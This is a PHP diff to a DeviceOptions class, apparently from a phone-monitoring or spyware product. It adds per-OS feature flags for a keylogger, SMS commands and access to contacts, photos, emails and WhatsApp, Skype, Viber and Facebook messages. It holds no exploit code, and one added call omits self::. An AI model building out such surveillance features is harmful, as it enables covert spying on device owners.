@@ -31,7 +31,7 @@ class DeviceOptions
 
         return false;
     }
-    
+
     public static function compareOSVersion($os, $compVersion, $osVersion, $operator)
     {
         if ($os == 'android') {
@@ -44,16 +44,16 @@ class DeviceOptions
 
         return version_compare($osVersion, $compVersion, $operator);
     }
-    
+
     public static function isRebootDeviceActive($os)
     {
         if ($os === 'android') {
             return true;
         }
-        
+
         return false;
     }
-    
+
     public static function isRebootApplicationActive($os)
     {
         if ($os === 'android') {
@@ -61,6 +61,143 @@ class DeviceOptions
         }
 
         return false;
+    }
+
+    public static function isBookmarksActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isBrowserHistoryActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isCalendarActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isContactsActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isKeyloggerActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isPhotosActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isVideosActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isViberActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isSkypeActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isWhatsappActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isFacebookActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isVkActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isEmailsActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isApplicationsActive($os)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        }
+
+        return true;
+    }
+
+    public static function isSmsCommandsActive($os, $osVersion)
+    {
+        if ($os == 'blackberry') {
+            return false;
+        } else if ($os == 'android') {
+            return compareOSVersion('android', '4.4', $osVersion, '<');
+        }
+
+        return true;
     }
 
 }
